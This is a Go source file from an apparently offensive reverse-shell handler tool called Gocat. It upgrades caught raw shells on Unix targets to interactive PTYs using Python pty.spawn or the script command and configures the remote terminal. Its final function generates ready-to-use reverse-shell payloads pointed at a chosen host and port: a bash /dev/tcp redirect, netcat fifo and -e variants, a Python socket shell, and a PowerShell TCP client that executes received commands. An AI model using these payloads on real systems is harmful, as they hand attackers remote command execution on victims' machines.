package shell

import (
	"fmt"
	"strings"
	"time"

	"github.com/realibrahimsql/Gocat/internal/logger"
	"github.com/realibrahimsql/Gocat/internal/session"
)

// UpgradeMethod represents a shell upgrade method
type UpgradeMethod string

const (
	MethodPython UpgradeMethod = "python"
	MethodScript UpgradeMethod = "script"
	MethodSocat  UpgradeMethod = "socat"
	MethodAuto   UpgradeMethod = "auto"
)

// UpgradeResult represents the result of a shell upgrade attempt
type UpgradeResult struct {
	Success bool
	Method  UpgradeMethod
	Error   error
}

// Upgrade attempts to upgrade a raw shell to an interactive PTY
func Upgrade(sess *session.Session, method UpgradeMethod) *UpgradeResult {
	if sess.OS != session.OSUnix {
		return &UpgradeResult{
			Success: false,
			Error:   fmt.Errorf("shell upgrade only supported on Unix targets"),
		}
	}

	if sess.Type == session.ShellPTY {
		return &UpgradeResult{
			Success: true,
			Method:  method,
		}
	}

	if method == MethodAuto {
		return autoUpgrade(sess)
	}

	switch method {
	case MethodPython:
		return upgradePython(sess)
	case MethodScript:
		return upgradeScript(sess)
	case MethodSocat:
		return upgradeSocat(sess)
	default:
		return &UpgradeResult{
			Success: false,
			Error:   fmt.Errorf("unknown upgrade method: %s", method),
		}
	}
}

// autoUpgrade tries all available upgrade methods
func autoUpgrade(sess *session.Session) *UpgradeResult {
	logger.Info("Attempting auto-upgrade...")

	// Try Python first (most reliable)
	if hasBinary(sess, "python3") || hasBinary(sess, "python") {
		result := upgradePython(sess)
		if result.Success {
			return result
		}
		logger.Debug("Python upgrade failed: %v", result.Error)
	}

	// Try script
	if hasBinary(sess, "script") {
		result := upgradeScript(sess)
		if result.Success {
			return result
		}
		logger.Debug("Script upgrade failed: %v", result.Error)
	}

	// Try socat
	if hasBinary(sess, "socat") {
		result := upgradeSocat(sess)
		if result.Success {
			return result
		}
		logger.Debug("Socat upgrade failed: %v", result.Error)
	}

	return &UpgradeResult{
		Success: false,
		Error:   fmt.Errorf("no upgrade method available"),
	}
}

// upgradePython uses Python to spawn a PTY
func upgradePython(sess *session.Session) *UpgradeResult {
	pyBin := "python3"
	if !hasBinary(sess, "python3") {
		pyBin = "python"
		if !hasBinary(sess, "python") {
			return &UpgradeResult{
				Success: false,
				Method:  MethodPython,
				Error:   fmt.Errorf("python not available"),
			}
		}
	}

	// Python PTY spawn command
	cmd := fmt.Sprintf(`%s -c 'import pty; pty.spawn("/bin/bash")'`, pyBin)

	_, err := sess.Send([]byte(cmd + "\n"))
	if err != nil {
		return &UpgradeResult{
			Success: false,
			Method:  MethodPython,
			Error:   fmt.Errorf("failed to send upgrade command: %w", err),
		}
	}

	time.Sleep(500 * time.Millisecond)

	// Verify upgrade
	if verifyPTY(sess) {
		sess.Type = session.ShellPTY
		sess.Interactive = true
		sess.Echoing = true
		logger.Info("Shell upgraded to PTY via Python!")

		// Set terminal type
		sess.Send([]byte("export TERM=xterm-256color\n"))
		time.Sleep(100 * time.Millisecond)

		return &UpgradeResult{
			Success: true,
			Method:  MethodPython,
		}
	}

	return &UpgradeResult{
		Success: false,
		Method:  MethodPython,
		Error:   fmt.Errorf("PTY verification failed after python upgrade"),
	}
}

// upgradeScript uses the `script` command to spawn a PTY
func upgradeScript(sess *session.Session) *UpgradeResult {
	if !hasBinary(sess, "script") {
		return &UpgradeResult{
			Success: false,
			Method:  MethodScript,
			Error:   fmt.Errorf("script command not available"),
		}
	}

	// script command varies by OS
	cmd := "script -qc /bin/bash /dev/null"
	_, err := sess.Send([]byte(cmd + "\n"))
	if err != nil {
		return &UpgradeResult{
			Success: false,
			Method:  MethodScript,
			Error:   fmt.Errorf("failed to send upgrade command: %w", err),
		}
	}

	time.Sleep(500 * time.Millisecond)

	if verifyPTY(sess) {
		sess.Type = session.ShellPTY
		sess.Interactive = true
		sess.Echoing = true
		logger.Info("Shell upgraded to PTY via script!")

		sess.Send([]byte("export TERM=xterm-256color\n"))
		time.Sleep(100 * time.Millisecond)

		return &UpgradeResult{
			Success: true,
			Method:  MethodScript,
		}
	}

	return &UpgradeResult{
		Success: false,
		Method:  MethodScript,
		Error:   fmt.Errorf("PTY verification failed after script upgrade"),
	}
}

// upgradeSocat uses socat to spawn a PTY
func upgradeSocat(sess *session.Session) *UpgradeResult {
	if !hasBinary(sess, "socat") {
		return &UpgradeResult{
			Success: false,
			Method:  MethodSocat,
			Error:   fmt.Errorf("socat not available"),
		}
	}

	// Note: socat PTY upgrade requires a new connection
	return &UpgradeResult{
		Success: false,
		Method:  MethodSocat,
		Error:   fmt.Errorf("socat upgrade requires a new connection - use socat payload instead"),
	}
}

// verifyPTY checks if the shell is now a PTY
func verifyPTY(sess *session.Session) bool {
	resp, err := sess.Exec("tty 2>/dev/null", 3*time.Second)
	if err != nil {
		return false
	}
	resp = strings.TrimSpace(resp)
	return strings.HasPrefix(resp, "/dev/")
}

// hasBinary checks if a binary is available
func hasBinary(sess *session.Session, name string) bool {
	if _, ok := sess.Binaries[name]; ok {
		return true
	}
	resp, err := sess.Exec(fmt.Sprintf("which %s 2>/dev/null", name), 2*time.Second)
	if err != nil || resp == "" {
		return false
	}
	sess.Binaries[name] = strings.TrimSpace(resp)
	return true
}

// SetTerminalSettings sets ROWS and COLS on the remote shell
func SetTerminalSettings(sess *session.Session, rows, cols int) error {
	if sess.Type != session.ShellPTY {
		return fmt.Errorf("can only set terminal settings on PTY sessions")
	}

	cmd := fmt.Sprintf("stty rows %d cols %d", rows, cols)
	_, err := sess.Exec(cmd, 2*time.Second)
	return err
}

// SetShellEnvironment configures the shell environment
func SetShellEnvironment(sess *session.Session) {
	env := map[string]string{
		"TERM":        "xterm-256color",
		"HISTCONTROL": "ignoredups:ignorespace",
		"HISTSIZE":    "10000",
		"PATH":        "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin",
	}

	for key, val := range env {
		sess.Send([]byte(fmt.Sprintf("export %s=%s\n", key, val)))
		time.Sleep(50 * time.Millisecond)
	}
}

// SpawnShellCommands generates commands for spawning shells on the target
func SpawnShellCommands(host string, port int) map[string]string {
	return map[string]string{
		"bash": fmt.Sprintf(
			"bash -i >& /dev/tcp/%s/%d 0>&1", host, port),
		"bash_bg": fmt.Sprintf(
			"(bash >& /dev/tcp/%s/%d 0>&1) &", host, port),
		"nc_pipe": fmt.Sprintf(
			"rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc %s %d >/tmp/_", host, port),
		"nc_e": fmt.Sprintf(
			"nc -e /bin/sh %s %d", host, port),
		"python": fmt.Sprintf(
			`python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("%s",%d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`,
			host, port),
		"powershell": fmt.Sprintf(
			`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('%s',%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
			host, port),
	}
}
